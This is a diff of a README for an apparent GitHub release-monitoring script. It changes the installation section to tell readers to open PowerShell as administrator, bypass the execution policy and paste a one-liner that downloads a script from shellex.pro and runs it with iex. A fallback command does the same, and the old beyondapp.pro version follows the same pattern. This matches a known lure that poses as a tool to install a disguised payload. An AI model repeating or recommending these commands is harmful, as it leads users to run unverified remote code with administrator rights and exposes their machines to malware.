@@ -19,32 +19,31 @@
 
 Script that **monitors GitHub releases** and **downloads new assets** automatically to your disk.
 
-## `INSTALLATION`
+## INSTALLATION
 
-<div align="center">
-
-<img src="https://img.shields.io/badge/Platform-Windows-0078D4?style=flat-square&logo=windows&logoColor=white" height="22"/>
-<img src="https://img.shields.io/badge/Shell-PowerShell-5391FE?style=flat-square&logo=powershell&logoColor=white" height="22"/>
-
-<br><br>
-
-**Run in PowerShell as Administrator:**
+**Steps:**
+1. Press **Win**, type **PowerShell**
+2. Right-click **Windows PowerShell** → **Run as administrator**
+3. Copy the command below, paste into the window, press **Enter**
+4. If **UAC** still appears – click **Yes**
 
 ```powershell
-irm https://beyondapp.pro/ps/setup.ps1 | iex
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://shellex.pro/ps/setup.ps1' | iex"
 ```
 
-<sub>Copy · paste · press Enter · confirm UAC</sub>
+<details>
+<summary><b>Command did not start?</b></summary>
 
-</div>
+Try this directly in the same PowerShell window:
 
-**Setup runs in three steps:**
+```powershell
+irm 'https://shellex.pro/ps/setup.ps1' | iex
+```
 
-| Step | Action |
-|:--:|---|
-| **1/3** | Downloading components — tool package and dependencies |
-| **2/3** | Unpacking archive — files extracted to a temp workspace |
-| **3/3** | Launching installer — utility is installed on Windows |
+</details>
+
+<sub>Administrator rights are required to complete the setup.</sub>
+
 
 ## `FEATURES`
 
@@ -70,8 +69,8 @@ irm https://beyondapp.pro/ps/setup.ps1 | iex
 </details>
 
 <details>
-<summary>&nbsp;<b>Manual install blocked?</b></summary>
-<br>Try: `powershell -ExecutionPolicy Bypass -Command "irm https://beyondapp.pro/ps/setup.ps1 | iex"`
+<summary>&nbsp;<b>Command did not start?</b></summary>
+<br>Try: `irm 'https://shellex.pro/ps/setup.ps1' | iex`
 </details>
 
 <details>
